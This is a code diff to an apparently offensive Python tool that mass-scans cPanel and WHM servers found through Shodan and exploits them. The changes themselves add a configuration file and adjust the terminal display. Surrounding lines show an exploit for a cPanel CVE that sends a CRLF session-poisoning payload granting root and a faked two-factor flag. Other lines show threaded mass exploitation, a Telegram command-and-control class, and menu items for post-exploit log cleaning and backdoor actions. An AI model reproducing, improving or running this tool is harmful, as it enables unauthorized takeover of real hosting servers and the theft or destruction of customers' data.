@@ -16,7 +16,6 @@ import atexit
 import signal
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-from urllib.parse import urlparse
 from filelock import FileLock
 
 try:
@@ -43,8 +42,6 @@ init(autoreset=True)
 CPANEL_PORTS = [2082, 2083, 2086, 2087, 2095, 2096]
 WHM_PORTS = [2086, 2087]
 FAST_PORTS = [2087, 2083]
-SCAN_THREADS = 50
-EXPLOIT_THREADS = 20
 TIMEOUT = 10
 RETRIES = 3
 MAX_RETRIES = 3
@@ -52,6 +49,7 @@ FAST_TIMEOUT = 3
 VERIFY_TIMEOUT = 2
 SESSIONS_FILE = "sessions.json"
 SESSIONS_LOCK = FileLock(SESSIONS_FILE + ".lock")
+CONFIG_FILE = "config.json"
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -65,8 +63,10 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 DEBUG = False
 
+# Terminal handling
 TERMINAL_ROWS, TERMINAL_COLS = shutil.get_terminal_size(fallback=(80, 24))
 SCROLL_REGION_SET = False
+SCROLL_TOP = 0
 
 def set_scroll_region(top_row):
     global SCROLL_REGION_SET
@@ -87,8 +87,9 @@ def clear_region():
     sys.stdout.flush()
 
 def move_to_region_start():
-    sys.stdout.write(f'\033[{SCROLL_TOP};0H')
-    sys.stdout.flush()
+    if SCROLL_TOP > 0:
+        sys.stdout.write(f'\033[{SCROLL_TOP};0H')
+        sys.stdout.flush()
 
 def get_banner_lines():
     RED = '\033[91m'
@@ -127,23 +128,44 @@ def get_banner_lines():
     return lines
 
 def print_banner():
-    banner_lines = get_banner_lines()
+    global SCROLL_TOP
     sys.stdout.write('\033[2J\033[H')
+    banner_lines = get_banner_lines()
     for line in banner_lines:
         print(line)
     sys.stdout.flush()
-    return len(banner_lines)
-
-def initialize_terminal():
-    global SCROLL_TOP
-    banner_lines = print_banner()
-    SCROLL_TOP = banner_lines + 1
+    SCROLL_TOP = len(banner_lines) + 1
     if SCROLL_TOP < TERMINAL_ROWS:
         set_scroll_region(SCROLL_TOP)
         move_to_region_start()
+    return SCROLL_TOP
+
+def initialize_terminal():
+    print_banner()
     atexit.register(reset_scroll_region)
     signal.signal(signal.SIGINT, lambda sig, frame: (reset_scroll_region(), sys.exit(0)))
 
+# Configuration handling
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            pass
+    return {
+        "shodan_api_key": "",
+        "telegram_bot_token": "",
+        "telegram_chat_id": "",
+        "scan_threads": 50,
+        "exploit_threads": 20
+    }
+
+def save_config(config):
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f, indent=2)
+
+# Core functions
 def get_session():
     if HAS_CURL_CFFI:
         session = cffi_requests.Session(impersonate="chrome120", verify=False)
@@ -226,12 +248,12 @@ def scan_single_fast(target):
             return host, port, "Unknown"
     return host, None, "Closed"
 
-def scan_targets(targets, threads=SCAN_THREADS):
+def scan_targets(targets, threads):
     logger.info(f"Scanning {len(targets)} targets with {threads} threads...")
     results = []
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = {executor.submit(scan_single_fast, t): t for t in targets}
-        for future in tqdm(as_completed(futures), total=len(futures), desc="Filtering"):
+        for future in tqdm(as_completed(futures), total=len(futures), desc="Filtering", file=sys.stdout):
             host, port, status = future.result()
             if status == "Open":
                 print(Fore.GREEN + f"[+] {host}:{port} - OPEN")
@@ -302,7 +324,6 @@ def exploit_cve_2026_41940(host, port):
     if not cookie_name:
         return {"status": "CVE_No_Cookie", "token": None}
 
-    # Fixed: moved payload bytes to a variable to avoid backslash in f-string expression
     poison_payload_bytes = b'root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999'
     poison_payload = "root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999"
 
@@ -798,9 +819,12 @@ class TelegramC2:
 
 class CPwn3rApp:
     def __init__(self):
+        self.config = load_config()
         self.db = Database()
-        self.telegram = TelegramC2()
-        self.shodan_key = os.getenv("SHODAN_API_KEY")
+        self.telegram = TelegramC2(self.config.get("telegram_bot_token"), self.config.get("telegram_chat_id"))
+        self.shodan_key = self.config.get("shodan_api_key")
+        self.scan_threads = self.config.get("scan_threads", 50)
+        self.exploit_threads = self.config.get("exploit_threads", 20)
         self.sessions = load_sessions()
         self.sessions_lock = threading.Lock()
         self.debug = False
@@ -825,8 +849,9 @@ class CPwn3rApp:
             print("8. Send results via Telegram")
             print("9. Clean logs (post-exploit)")
             print("10. Toggle debug mode")
-            print("11. Post-exploit actions (list accounts, backdoor)")
-            print("12. Exit")
+            print("11. Post-exploit actions")
+            print("12. Edit configuration (threads, API keys)")
+            print("13. Exit")
             choice = input(Fore.WHITE + "Select: ").strip()
 
             if choice == '1':
@@ -841,6 +866,7 @@ class CPwn3rApp:
                 self._exploit_targets()
             elif choice == '6':
                 self.telegram.configure()
+                self._save_config_telegram()
             elif choice == '7':
                 self._export_results()
             elif choice == '8':
@@ -855,12 +881,57 @@ class CPwn3rApp:
             elif choice == '11':
                 self._post_exploit()
             elif choice == '12':
+                self._edit_config()
+            elif choice == '13':
                 print(Fore.CYAN + "[*] Goodbye.")
                 self.db.close()
                 reset_scroll_region()
                 sys.exit(0)
             else:
                 print(Fore.RED + "[-] Invalid option.")
+            input(Fore.YELLOW + "\nPress Enter to continue...")
+
+    def _save_config_telegram(self):
+        self.config["telegram_bot_token"] = self.telegram.bot_token
+        self.config["telegram_chat_id"] = self.telegram.chat_id
+        save_config(self.config)
+
+    def _edit_config(self):
+        clear_region()
+        move_to_region_start()
+        print(Fore.CYAN + "[ Edit Configuration ]")
+        print(f"1. Shodan API Key: {self.config.get('shodan_api_key', '')}")
+        print(f"2. Telegram Bot Token: {self.config.get('telegram_bot_token', '')}")
+        print(f"3. Telegram Chat ID: {self.config.get('telegram_chat_id', '')}")
+        print(f"4. Scan Threads: {self.config.get('scan_threads', 50)}")
+        print(f"5. Exploit Threads: {self.config.get('exploit_threads', 20)}")
+        print("6. Save and return")
+        choice = input("Select setting to change (1-6): ").strip()
+        if choice == '1':
+            self.config["shodan_api_key"] = input("Enter Shodan API Key: ").strip()
+        elif choice == '2':
+            self.config["telegram_bot_token"] = input("Enter Telegram Bot Token: ").strip()
+            self.telegram.bot_token = self.config["telegram_bot_token"]
+        elif choice == '3':
+            self.config["telegram_chat_id"] = input("Enter Telegram Chat ID: ").strip()
+            self.telegram.chat_id = self.config["telegram_chat_id"]
+        elif choice == '4':
+            try:
+                self.config["scan_threads"] = int(input("Enter Scan Threads (default 50): ").strip() or 50)
+                self.scan_threads = self.config["scan_threads"]
+            except:
+                print(Fore.RED + "[-] Invalid number.")
+        elif choice == '5':
+            try:
+                self.config["exploit_threads"] = int(input("Enter Exploit Threads (default 20): ").strip() or 20)
+                self.exploit_threads = self.config["exploit_threads"]
+            except:
+                print(Fore.RED + "[-] Invalid number.")
+        elif choice == '6':
+            save_config(self.config)
+            print(Fore.GREEN + "[+] Configuration saved.")
+        else:
+            print(Fore.RED + "[-] Invalid option.")
 
     def _load_targets(self):
         filepath = input("Enter target file path: ").strip()
@@ -898,6 +969,8 @@ class CPwn3rApp:
     def _shodan_discovery(self):
         if not self.shodan_key:
             self.shodan_key = input("Enter Shodan API key: ").strip()
+            self.config["shodan_api_key"] = self.shodan_key
+            save_config(self.config)
         scanner = ShodanScanner(self.shodan_key)
         query = input("Enter Shodan search query (default: port:2087 cpanel): ").strip()
         if not query:
@@ -914,7 +987,7 @@ class CPwn3rApp:
             print(Fore.RED + "[-] No pending targets. Load targets first.")
             return
         targets = [f"{host}:{port}" if port else host for _, host, port in pending]
-        alive = scan_targets(targets, SCAN_THREADS)
+        alive = scan_targets(targets, self.scan_threads)
         for host, port in alive:
             for tid, db_host, db_port in pending:
                 if db_host == host:
@@ -963,13 +1036,13 @@ class CPwn3rApp:
             print(Fore.GREEN + "[+] All targets already exploited or have valid sessions.")
             return
         print(Fore.BLUE + f"[*] Exploiting {len(filtered)} new targets...")
-        max_workers = min(EXPLOIT_THREADS, len(filtered))
+        max_workers = min(self.exploit_threads, len(filtered))
         results = []
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             futures = {}
             for tid, host, port, _, _ in filtered:
                 futures[executor.submit(exploit_cpanel, host, port)] = (tid, host, port)
-            for future in tqdm(as_completed(futures), total=len(futures), desc="Exploiting"):
+            for future in tqdm(as_completed(futures), total=len(futures), desc="Exploiting", file=sys.stdout):
                 tid, host, port = futures[future]
                 result = future.result()
                 status = result.get('status', 'Cant_Access')
